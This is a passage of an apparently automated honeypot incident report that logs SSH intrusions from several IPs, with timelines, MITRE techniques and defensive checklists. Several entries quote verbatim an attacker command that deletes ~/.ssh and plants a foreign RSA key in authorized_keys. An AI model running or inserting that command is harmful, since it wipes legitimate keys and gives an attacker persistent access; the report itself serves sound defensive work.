|---|---|
| `2026-06-09 11:41:34` | `cowrie.session.connect` |
| `2026-06-09 11:41:36` | `cowrie.client.version` |
| `2026-06-09 11:41:37` | `cowrie.client.kex` |
| `2026-06-09 11:41:44` | `cowrie.login.success` |
| `2026-06-09 11:41:47` | `cowrie.session.params` |
| `2026-06-09 11:41:47` | `cowrie.command.input` |
| `2026-06-09 11:41:47` | `cowrie.command.failed` |
| `2026-06-09 11:41:50` | `cowrie.log.closed` |
| `2026-06-09 11:41:52` | `cowrie.session.params` |
| `2026-06-09 11:41:52` | `cowrie.command.input` |
| `2026-06-09 11:41:53` | `cowrie.session.file_download` |
| `2026-06-09 11:41:53` | `cowrie.log.closed` |
| `2026-06-09 11:42:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.74.68[.]248` to AbuseIPDB if not already reported
- [ ] Block `40.74.68[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d394d5e2e8da

| Field | Detail |
|---|---|
| **Source IP** | `103.13.206[.]100` |
| **First Seen** | 2026-06-09 11:41 |
| **Last Seen** | 2026-06-09 11:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 11:41:34` | `cowrie.session.connect` |
| `2026-06-09 11:41:34` | `cowrie.client.version` |
| `2026-06-09 11:41:34` | `cowrie.client.kex` |
| `2026-06-09 11:41:35` | `cowrie.login.success` |
| `2026-06-09 11:41:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.13.206[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.13.206[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1316c20202d

| Field | Detail |
|---|---|
| **Source IP** | `40.74.68[.]248` |
| **First Seen** | 2026-06-09 11:42 |
| **Last Seen** | 2026-06-09 11:42 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 11:42:07` | `cowrie.session.connect` |
| `2026-06-09 11:42:07` | `cowrie.client.version` |
| `2026-06-09 11:42:09` | `cowrie.client.kex` |
| `2026-06-09 11:42:11` | `cowrie.login.success` |
| `2026-06-09 11:42:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.74.68[.]248` to AbuseIPDB if not already reported
- [ ] Block `40.74.68[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1dd00034ea3f

| Field | Detail |
|---|---|
| **Source IP** | `103.13.206[.]100` |
| **First Seen** | 2026-06-09 11:44 |
| **Last Seen** | 2026-06-09 11:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 11:44:21` | `cowrie.session.connect` |
| `2026-06-09 11:44:21` | `cowrie.client.version` |
| `2026-06-09 11:44:21` | `cowrie.client.kex` |
| `2026-06-09 11:44:21` | `cowrie.login.success` |
| `2026-06-09 11:44:21` | `cowrie.session.params` |
| `2026-06-09 11:44:21` | `cowrie.command.input` |
| `2026-06-09 11:44:21` | `cowrie.command.failed` |
| `2026-06-09 11:44:21` | `cowrie.log.closed` |
| `2026-06-09 11:44:22` | `cowrie.session.params` |
| `2026-06-09 11:44:22` | `cowrie.command.input` |
| `2026-06-09 11:44:22` | `cowrie.session.file_download` |
| `2026-06-09 11:44:22` | `cowrie.log.closed` |
| `2026-06-09 11:44:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.13.206[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.13.206[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66729df08eaf

| Field | Detail |
|---|---|
| **Source IP** | `103.13.206[.]100` |
| **First Seen** | 2026-06-09 11:44 |
| **Last Seen** | 2026-06-09 11:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 11:44:23` | `cowrie.session.connect` |
| `2026-06-09 11:44:23` | `cowrie.client.version` |
| `2026-06-09 11:44:23` | `cowrie.client.kex` |
| `2026-06-09 11:44:24` | `cowrie.login.success` |
| `2026-06-09 11:44:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.13.206[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.13.206[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e545dced56f

| Field | Detail |
|---|---|
| **Source IP** | `135.13.28[.]35` |
| **First Seen** | 2026-06-09 11:44 |
| **Last Seen** | 2026-06-09 11:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 11:44:44` | `cowrie.session.connect` |
| `2026-06-09 11:44:44` | `cowrie.client.version` |
| `2026-06-09 11:44:44` | `cowrie.client.kex` |
| `2026-06-09 11:44:44` | `cowrie.login.success` |
| `2026-06-09 11:44:44` | `cowrie.session.params` |
| `2026-06-09 11:44:44` | `cowrie.command.input` |
| `2026-06-09 11:44:44` | `cowrie.command.failed` |
| `2026-06-09 11:44:45` | `cowrie.log.closed` |
| `2026-06-09 11:44:45` | `cowrie.session.params` |
| `2026-06-09 11:44:45` | `cowrie.command.input` |
| `2026-06-09 11:44:45` | `cowrie.session.file_download` |
| `2026-06-09 11:44:45` | `cowrie.log.closed` |
| `2026-06-09 11:44:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.13.28[.]35` to AbuseIPDB if not already reported
- [ ] Block `135.13.28[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7aea14b74f67

| Field | Detail |
|---|---|
| **Source IP** | `135.13.28[.]35` |
| **First Seen** | 2026-06-09 11:44 |
| **Last Seen** | 2026-06-09 11:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 11:44:46` | `cowrie.session.connect` |
| `2026-06-09 11:44:46` | `cowrie.client.version` |
| `2026-06-09 11:44:46` | `cowrie.client.kex` |
| `2026-06-09 11:44:46` | `cowrie.login.success` |
| `2026-06-09 11:44:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.13.28[.]35` to AbuseIPDB if not already reported
- [ ] Block `135.13.28[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e778b719669

| Field | Detail |
|---|---|
| **Source IP** | `103.143.10[.]140` |
| **First Seen** | 2026-06-09 11:46 |
| **Last Seen** | 2026-06-09 11:46 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 11:46:36` | `cowrie.session.connect` |
| `2026-06-09 11:46:36` | `cowrie.client.version` |
| `2026-06-09 11:46:36` | `cowrie.client.kex` |
| `2026-06-09 11:46:38` | `cowrie.login.success` |
| `2026-06-09 11:46:38` | `cowrie.session.params` |
| `2026-06-09 11:46:38` | `cowrie.command.input` |
| `2026-06-09 11:46:38` | `cowrie.command.failed` |
| `2026-06-09 11:46:39` | `cowrie.log.closed` |
| `2026-06-09 11:46:39` | `cowrie.session.params` |
| `2026-06-09 11:46:39` | `cowrie.command.input` |
| `2026-06-09 11:46:39` | `cowrie.session.file_download` |
| `2026-06-09 11:46:39` | `cowrie.log.closed` |
| `2026-06-09 11:46:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.10[.]140` to AbuseIPDB if not already reported
- [ ] Block `103.143.10[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfdd366e31e5

| Field | Detail |
|---|---|
| **Source IP** | `103.143.10[.]140` |
| **First Seen** | 2026-06-09 11:46 |
| **Last Seen** | 2026-06-09 11:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 11:46:43` | `cowrie.session.connect` |
| `2026-06-09 11:46:43` | `cowrie.client.version` |
| `2026-06-09 11:46:43` | `cowrie.client.kex` |
| `2026-06-09 11:46:44` | `cowrie.login.success` |
| `2026-06-09 11:46:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.10[.]140` to AbuseIPDB if not already reported
- [ ] Block `103.143.10[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-706e936a2221

| Field | Detail |
|---|---|
| **Source IP** | `103.143.10[.]140` |
| **First Seen** | 2026-06-09 11:48 |
| **Last Seen** | 2026-06-09 11:48 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 11:48:13` | `cowrie.session.connect` |
| `2026-06-09 11:48:13` | `cowrie.client.version` |
| `2026-06-09 11:48:13` | `cowrie.client.kex` |
| `2026-06-09 11:48:14` | `cowrie.login.success` |
| `2026-06-09 11:48:15` | `cowrie.session.params` |
| `2026-06-09 11:48:15` | `cowrie.command.input` |
| `2026-06-09 11:48:15` | `cowrie.command.failed` |
| `2026-06-09 11:48:15` | `cowrie.log.closed` |
| `2026-06-09 11:48:16` | `cowrie.session.params` |
| `2026-06-09 11:48:16` | `cowrie.command.input` |
| `2026-06-09 11:48:16` | `cowrie.session.file_download` |
| `2026-06-09 11:48:16` | `cowrie.log.closed` |
| `2026-06-09 11:48:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.10[.]140` to AbuseIPDB if not already reported
- [ ] Block `103.143.10[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-093d8c9bb60a

| Field | Detail |
|---|---|
| **Source IP** | `103.143.10[.]140` |
| **First Seen** | 2026-06-09 11:48 |
| **Last Seen** | 2026-06-09 11:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 11:48:19` | `cowrie.session.connect` |
| `2026-06-09 11:48:19` | `cowrie.client.version` |
| `2026-06-09 11:48:19` | `cowrie.client.kex` |
| `2026-06-09 11:48:21` | `cowrie.login.success` |
| `2026-06-09 11:48:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.10[.]140` to AbuseIPDB if not already reported
- [ ] Block `103.143.10[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17ea077dd8a7

| Field | Detail |
|---|---|
| **Source IP** | `103.143.10[.]140` |
| **First Seen** | 2026-06-09 11:53 |
| **Last Seen** | 2026-06-09 11:53 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 11:53:26` | `cowrie.session.connect` |
| `2026-06-09 11:53:26` | `cowrie.client.version` |
| `2026-06-09 11:53:26` | `cowrie.client.kex` |
| `2026-06-09 11:53:27` | `cowrie.login.success` |
| `2026-06-09 11:53:28` | `cowrie.session.params` |
| `2026-06-09 11:53:28` | `cowrie.command.input` |
| `2026-06-09 11:53:28` | `cowrie.command.failed` |
| `2026-06-09 11:53:29` | `cowrie.log.closed` |
| `2026-06-09 11:53:29` | `cowrie.session.params` |
| `2026-06-09 11:53:29` | `cowrie.command.input` |
| `2026-06-09 11:53:29` | `cowrie.session.file_download` |
| `2026-06-09 11:53:29` | `cowrie.log.closed` |
| `2026-06-09 11:53:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.10[.]140` to AbuseIPDB if not already reported
- [ ] Block `103.143.10[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-693ba6d40a0c

| Field | Detail |
|---|---|
| **Source IP** | `103.143.10[.]140` |
| **First Seen** | 2026-06-09 11:53 |
| **Last Seen** | 2026-06-09 11:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 11:53:33` | `cowrie.session.connect` |
| `2026-06-09 11:53:33` | `cowrie.client.version` |
| `2026-06-09 11:53:33` | `cowrie.client.kex` |
| `2026-06-09 11:53:34` | `cowrie.login.success` |
| `2026-06-09 11:53:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.10[.]140` to AbuseIPDB if not already reported
- [ ] Block `103.143.10[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6faa281f36df

| Field | Detail |
|---|---|
| **Source IP** | `40.74.68[.]248` |
| **First Seen** | 2026-06-09 11:54 |
| **Last Seen** | 2026-06-09 11:55 |
| **Session Duration** | 38s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 11:54:50` | `cowrie.session.connect` |
| `2026-06-09 11:54:50` | `cowrie.client.version` |
| `2026-06-09 11:54:53` | `cowrie.client.kex` |
| `2026-06-09 11:55:01` | `cowrie.login.success` |
| `2026-06-09 11:55:04` | `cowrie.session.params` |
| `2026-06-09 11:55:04` | `cowrie.command.input` |
| `2026-06-09 11:55:04` | `cowrie.command.failed` |
| `2026-06-09 11:55:05` | `cowrie.log.closed` |
| `2026-06-09 11:55:07` | `cowrie.session.params` |
| `2026-06-09 11:55:07` | `cowrie.command.input` |
| `2026-06-09 11:55:10` | `cowrie.session.file_download` |
| `2026-06-09 11:55:10` | `cowrie.log.closed` |
| `2026-06-09 11:55:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.74.68[.]248` to AbuseIPDB if not already reported
- [ ] Block `40.74.68[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13ce370e26bb

| Field | Detail |
|---|---|
| **Source IP** | `40.74.68[.]248` |
| **First Seen** | 2026-06-09 11:55 |
| **Last Seen** | 2026-06-09 11:55 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 11:55:21` | `cowrie.session.connect` |
| `2026-06-09 11:55:22` | `cowrie.client.version` |
| `2026-06-09 11:55:22` | `cowrie.client.kex` |
| `2026-06-09 11:55:28` | `cowrie.login.success` |
| `2026-06-09 11:55:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.74.68[.]248` to AbuseIPDB if not already reported
- [ ] Block `40.74.68[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b7f9f9c16e2

| Field | Detail |
|---|---|
| **Source IP** | `103.143.10[.]140` |
| **First Seen** | 2026-06-09 11:56 |
| **Last Seen** | 2026-06-09 11:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 11:56:58` | `cowrie.session.connect` |
| `2026-06-09 11:56:58` | `cowrie.client.version` |
| `2026-06-09 11:56:58` | `cowrie.client.kex` |
| `2026-06-09 11:56:59` | `cowrie.login.success` |
| `2026-06-09 11:57:00` | `cowrie.session.params` |
| `2026-06-09 11:57:00` | `cowrie.command.input` |
| `2026-06-09 11:57:00` | `cowrie.command.failed` |
| `2026-06-09 11:57:00` | `cowrie.log.closed` |
| `2026-06-09 11:57:01` | `cowrie.session.params` |
| `2026-06-09 11:57:01` | `cowrie.command.input` |
| `2026-06-09 11:57:01` | `cowrie.session.file_download` |
| `2026-06-09 11:57:01` | `cowrie.log.closed` |
| `2026-06-09 11:57:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.10[.]140` to AbuseIPDB if not already reported
- [ ] Block `103.143.10[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f404fb4e8b7f

| Field | Detail |
|---|---|
| **Source IP** | `103.143.10[.]140` |
| **First Seen** | 2026-06-09 11:57 |
| **Last Seen** | 2026-06-09 11:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 11:57:04` | `cowrie.session.connect` |
| `2026-06-09 11:57:04` | `cowrie.client.version` |
| `2026-06-09 11:57:04` | `cowrie.client.kex` |
| `2026-06-09 11:57:06` | `cowrie.login.success` |
| `2026-06-09 11:57:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.10[.]140` to AbuseIPDB if not already reported
- [ ] Block `103.143.10[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d59a787e915

| Field | Detail |
|---|---|
| **Source IP** | `106.75.224[.]96` |
| **First Seen** | 2026-06-09 11:58 |
| **Last Seen** | 2026-06-09 11:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 11:58:40` | `cowrie.session.connect` |
| `2026-06-09 11:58:40` | `cowrie.client.version` |
| `2026-06-09 11:58:40` | `cowrie.client.kex` |
| `2026-06-09 11:58:40` | `cowrie.login.success` |
| `2026-06-09 11:58:41` | `cowrie.session.params` |
| `2026-06-09 11:58:41` | `cowrie.command.input` |
| `2026-06-09 11:58:41` | `cowrie.command.failed` |
| `2026-06-09 11:58:41` | `cowrie.log.closed` |
| `2026-06-09 11:58:41` | `cowrie.session.params` |
| `2026-06-09 11:58:41` | `cowrie.command.input` |
| `2026-06-09 11:58:41` | `cowrie.session.file_download` |
| `2026-06-09 11:58:41` | `cowrie.log.closed` |
